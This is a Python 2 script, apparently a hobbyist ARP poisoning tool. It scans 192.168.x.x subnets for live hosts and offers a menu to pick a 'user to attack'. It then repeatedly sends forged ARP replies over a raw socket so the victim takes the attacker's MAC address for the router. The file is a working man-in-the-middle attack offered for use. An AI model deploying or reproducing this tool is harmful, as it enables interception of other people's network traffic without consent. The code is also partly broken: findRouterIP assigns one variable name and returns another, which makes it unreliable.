import sys, string, argparse, re, os
from socket import *
from struct import *
from time import sleep
from subprocess import Popen, PIPE,check_output
from uuid import getnode

ETHER_BROADCAST = "\xff"*6 # NOTE(cab): Broadcast address (ff:ff:ff:ff:ff:ff)
ETH_P_ETHERNET  = 0x0001   # NOTE(cab): Hardware type(protocole) Ethernet
ETH_P_IP        = 0x0800   # NOTE(cab): IPv4
ETH_P_ARP       = 0x0806   # NOTE(cab): ARP
ETH_P_H_LEN     = 0x0006   # NOTE(cab): Ethernet addresses size is 6
ETH_P_P_LEN     = 0x0004   # NOTE(cab): IPv4 addresses size is 4
ETH_P_OPER      = 0x0002   # NOTE(cab): Type of operation; 1 for request and 2 for reply
ETH_ADAPTER     = "eth1"   # NOTE(cab): Network adapter
# NOTE(cab): List ot EtherType - http://en.wikipedia.org/wiki/EtherType

verbose = True

def mac_to_string(mac_address):
    return ':'.join(("%012X" % mac_address)[i:i+2] for i in range(0, 12, 2)).upper()

def string_to_mac(mac_address):
    return mac_address.replace(':', '').lower().decode('hex')

def log(message):
    if verbose:
        print(message)

def startPoisoning(victim_ip, router_ip):
    os.system('clear')
    log("You are now attacking " + victim_ip + " ...")
    log("And you will be spoofed as the router at " + router_ip)

    try:
        # NOTE(cab):
        #   AF_PACKET = Type of packet (packet socket)
        #      |-> doesn't work on Windows nor OS X. Will have to use https://pypi.python.org/pypi/pypcap
        #                                            |-> Or use Ubuntu
        #   SOCK_RAW = Send without any changes in the packet data
        #   htons = Convert to unsigned short host byte order to network byte order
        # Source: http://man7.org/linux/man-pages/man7/packet.7.html
        s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))
        s.bind((ETH_ADAPTER, ETH_P_ARP))
        my_mac = getnode()

        # NOTE(cab): Can't use gethostname() since it return 127.0.0.1 on Ubuntu
        my_ip = gethostbyname(getfqdn())

        # NOTE(cab): From the documentation, the last bit is set to 1 if
        # the MAC Address is invalid
        if (my_mac >> 40) % 2:
            print "This MAC Address is invalid"
            print "I do not know what to do"
            print "I QUIT !"
            return

        my_mac = mac_to_string(my_mac)
        log("Current User IP Address: " + my_ip)
        log("Current User MAC Address: " + my_mac)

        packet = create_packet(victim_ip, router_ip, my_mac)

        sleep_time = 1
        log("Sending every " + str(sleep_time) + " seconds")
        while True:
            log("Sending packet")
            s.send(packet)
            sleep(sleep_time)
    except KeyboardInterrupt:
        log("Interrupted by user")
        pass

# NOTE(cab):
# Packet Structure:
# http://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure
# Format:
#   inet_aton = Convert IPv4 into binary form (in network by order)
#   INADDR_ANY = Bound to all local interfaces
#   pack -> Byte Order
#       ! = network (= big-endian)
#        -> Format
#       I = unsigned int
#       H = unsigned short
#       B = unsigned char
def create_packet(victim_ip, router_ip, my_mac):
    victim_mac = get_mac_from_ip(victim_ip)
    log("Victim MAC Address: " + victim_mac)

    # NOTE(cab): This fixes all my proble, I had to convert to binary format!
    my_mac = string_to_mac(my_mac)
    victim_mac = string_to_mac(victim_mac)

    arp_frame = [
        victim_mac,
        my_mac,
        pack("!H", ETH_P_ARP),
        pack("!HHBBH", ETH_P_ETHERNET, ETH_P_IP, ETH_P_H_LEN, ETH_P_P_LEN, ETH_P_OPER),
        my_mac,
        inet_aton(router_ip),
        ETHER_BROADCAST,
        pack("!I", INADDR_ANY)
    ]
    return ''.join(arp_frame)

def get_mac_from_ip(ip_address):
    # NOTE(cab): Snippet from: http://snipplr.com/view/70832/get-arp-mac-from-ip-address/
    Popen(["ping", "-c 1", ip_address], stdout = PIPE)
    pid = Popen(["arp", "-n", ip_address], stdout = PIPE)
    s = pid.communicate()[0]
    mac_address = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
    return mac_address.upper()

def getIpAddresses():
    # NOTE(cab): Snippet from: http://ubuntuforums.org/showthread.php?t=724138
    raw_list = getaddrinfo(gethostname(), None)

    ip_addresses = []
    for item in raw_list:
        ip_addresses.append(item[4][0])

    # NOTE(cab): We want only unique values, but want to be able to still
    # access the item at a certain index
    # TODO(cab): Must remove self - lol
    return list(set(ip_addresses))

def ipScanner(range_selection):
    # NOTE(cab): Snippet from: https://code.google.com/p/jaccon-ipscanner/source/browse/ipscanner.py

    selected_range = []
    if range_selection == 0:
        selected_range.append("192.168.0.")
    elif range_selection == 1:
        selected_range.append("192.168.1.")
    elif range_selection == 2:
        selected_range.append("192.168.2.")
    elif range_selection == 3:
        selected_range.extend(("192.168.0.", "192.168.1.", "192.168.2."))
    else:
        selected_range.append("192.168.1.")

    scanned_ips = []
    active_ips = []

    devnull = open(os.devnull, "wb") # NOTE(cab): We do not want to output the
                                     # results in the console

    log("PROCESSING - PLEASE WAIT")
    for ip_range in selected_range:
        for i in range(1, 255):
            ip = ip_range + str(i)
            # Start ping process
            scanned_ips.append((ip, Popen(['ping', '-c 5', ip], stdout = devnull)))

    while scanned_ips:
        for i, (ip, proc) in enumerate(scanned_ips[:]):
            if proc.poll() is not None: # Ping has finished
                scanned_ips.remove((ip, proc)) # Fugly - O(n^2)
                if proc.returncode == 0:
                    active_ips.append(ip)
                # Else we do not care

    devnull.close()
    return active_ips

def manualAttackMenu():
    os.system('clear')
    print "Type 'exit' to exit or 'return' to go back in the menus"
    user_selection = raw_input("Please enter the IP Address (no validations): ")
    if user_selection == "return":
        runIPScannerMenu()
    elif user_selection == "exit":
        log("Exited by user")
        return
    else:
        victim_ip = user_selection
        router_ip = findRouterIP()
        startPoisoning(victim_ip, router_ip)

def mainMenu():
    os.system('clear')
    print "================================"
    print "Let's Arp Poison all the things!"
    print "================================"
    print " - By CAB"
    print "\n"
    print "[0] Yes"
    print "[1] No, run the IP Scanner"
    print "Type 'exit' to exit or 'return' to go back in the menus"
    user_selection = raw_input("Do you already know the ip address you want to spoof? ")
    if user_selection == "0":
        manualAttackMenu()
    elif user_selection == "1":
        runIPScannerMenu()
    else:
        log("Exited by user")
        return

def runIPScannerMenu():
    os.system('clear')
    print "[0] 192.168.0.x"
    print "[1] 192.168.1.x"
    print "[2] 192.168.2.x"
    print "[3] I do not know (will run them all)"
    print "Type 'exit' to exit or 'return' to go back in the menus"
    user_selection = raw_input("Select the IP range you are interested with: ")
    if user_selection == "return":
        mainMenu()
    elif user_selection == "exit":
        log("Exited by user")
        return
    else:
        ip_addresses = ipScanner(int(user_selection))
        selectIpToAttackMenu(ip_addresses)

def selectIpToAttackMenu(ip_addresses):
    os.system('clear')
    for index, ip_address in enumerate(ip_addresses):
        print "["+ str(index) +"]" + ip_address + " - " + getfqdn(ip_address)

    print "Type 'exit' to exit or 'return' to go back in the menus"
    user_selection = raw_input("Select a user to attack: ")

    if user_selection == "return":
        runIPScannerMenu()
    elif user_selection == 'exit':
        log("Exited by user")
        return
    else:
        parsed_selection = int(user_selection)
        victim_ip = ip_addresses[parsed_selection]
        router_ip = findRouterIP()
        startPoisoning(victim_ip, router_ip)

def findRouterIP():
    route_ip = check_output("route | grep default", shell=True).split()
    return router_ip[1]

mainMenu()
